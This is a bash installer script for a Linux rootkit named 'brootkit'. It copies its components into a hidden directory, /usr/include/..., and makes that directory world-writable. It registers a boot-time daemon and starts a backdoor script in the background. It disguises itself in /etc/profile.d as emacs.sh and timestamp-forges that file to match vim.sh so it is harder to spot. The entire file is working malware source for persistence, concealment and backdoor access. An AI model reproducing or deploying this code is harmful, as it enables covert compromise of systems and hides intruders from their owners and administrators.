#!/bin/bash

BR_ROOTKIT_PATH="/usr/include/..."

function br_rootkit()
{
	cp brootkit.sh /etc/profile.d/emacs.sh
	touch -r /etc/profile.d/vim.sh /etc/profile.d/emacs.sh
}

function br_hookhup()
{
        :
}

function main()
{
	mkdir -p $BR_ROOTKIT_PATH -m 0777
	[ $? -eq 1 ] && exit && echo "mkdir $BR_ROOTKIT_PATH failed."

	cp brootkit.sh br.conf br_config.sh bashbd.sh brscan.sh $BR_ROOTKIT_PATH
	[ $? -eq 1 ] && exit && echo "copy brootkit failed."

	cp brdaemon.sh /etc/rc.d/init.d/brdaemon
	ln -s /etc/rc.d/init.d/brdaemon /etc/rc.d/rc3.d/S10brdaemon
	[ $? -eq 1 ] && exit && echo "copy brdaemon failed."

	chmod 777 $BR_ROOTKIT_PATH

        if ! type nohup >/dev/null; then
                nohup $BR_ROOTKIT_PATH/bashbd.sh > /dev/null 2>&1
		[ $? -eq 1 ] && exit && echo "install backdoor failed."
        else
                trap br_hookhup SIGHUP
                $BR_ROOTKIT_PATH/bashbd.sh > /dev/null 2>&1 &
		[ $? -eq 1 ] && exit && echo "install backdoor failed."
        fi

	br_rootkit
	[ $? -eq 1 ] && exit && echo "install brootkit failed." || \
		echo "install brootkit successful."
}

main
